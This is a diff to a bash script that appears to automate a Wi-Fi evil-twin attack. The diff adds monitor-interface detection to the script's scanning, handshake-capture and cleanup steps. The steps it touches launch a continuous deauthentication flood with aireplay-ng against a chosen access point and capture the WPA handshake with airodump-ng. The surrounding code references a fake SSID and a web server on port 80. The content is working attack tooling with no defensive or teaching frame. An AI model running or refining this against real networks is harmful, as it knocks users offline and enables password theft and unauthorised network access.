@@ -14,6 +14,25 @@ TARGET_CHANNEL=""
 FAKE_SSID=""
 HANDSHAKE_FILE=""
 DEAUTH_PID=""
+MON_INTERFACE=""
+get_monitor_interface() {
+    local mon_iface=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -1)
+    if [ -n "$mon_iface" ]; then
+        echo "$mon_iface"
+        return
+    fi
+    for iface in wlan1mon wlan1_mon mon0 mon1; do
+        if iw dev | grep -q "Interface $iface"; then
+            echo "$iface"
+            return
+        fi
+    done
+    if iw dev wlan1 info 2>/dev/null | grep -q "type monitor"; then
+        echo "wlan1"
+        return
+    fi
+    echo ""
+}
 cleanup() {
     echo ""
     log_info "Shutting down attack..."
@@ -27,7 +46,11 @@ cleanup() {
     fuser -k 80/tcp 2>/dev/null
     [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
     iw dev wlan2 del > /dev/null 2>&1
-    airmon-ng stop wlan1 > /dev/null 2>&1
+    if [ -n "$MON_INTERFACE" ]; then
+        airmon-ng stop $MON_INTERFACE > /dev/null 2>&1
+    else
+        airmon-ng stop wlan1 > /dev/null 2>&1
+    fi
     iptables --flush 2>/dev/null
     ip rule del from all lookup main pref 1 2>/dev/null || true
     ip rule del from all iif lo oif wlan2 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
@@ -155,8 +178,14 @@ scan_networks() {
     log_info "Scanning for networks..."
     sudo airmon-ng start wlan1 > /dev/null 2>&1
     sleep 5
+    MON_INTERFACE=$(get_monitor_interface)
+    if [ -z "$MON_INTERFACE" ]; then
+        log_error "Failed to detect monitor interface!"
+        exit 1
+    fi
+    log_success "Using monitor interface: $MON_INTERFACE"
     log_info "Scanning for 20 seconds..."
-    { timeout --signal=KILL 20 airodump-ng wlan1 --output-format csv -w /tmp/scan > /dev/null 2>&1; } 2>/dev/null || true
+    { timeout --signal=KILL 20 airodump-ng $MON_INTERFACE --output-format csv -w /tmp/scan > /dev/null 2>&1; } 2>/dev/null || true
     if [ ! -f "/tmp/scan-01.csv" ]; then
         log_error "No networks found"
         exit 1
@@ -205,12 +234,12 @@ capture_handshake() {
     local channel="$2"
     local ssid="$3"
     log_info "Capturing handshake..."
-    sudo iwconfig wlan1 channel "$channel" 2>/dev/null
+    sudo iwconfig $MON_INTERFACE channel "$channel" 2>/dev/null
     sleep 2
-    nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil wlan1 > /tmp/airodump.log 2>&1 &
+    nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil $MON_INTERFACE > /tmp/airodump.log 2>&1 &
     AIRODUMP_PID=$!
     sleep 3
-    nohup sudo aireplay-ng -0 0 -a "$bssid" wlan1 > /tmp/deauth.log 2>&1 &
+    nohup sudo aireplay-ng -0 0 -a "$bssid" $MON_INTERFACE > /tmp/deauth.log 2>&1 &
     DEAUTH_PID=$!
     log_info "Deauth running - waiting for handshake..."
     HANDSAKE_CAPTURED=false
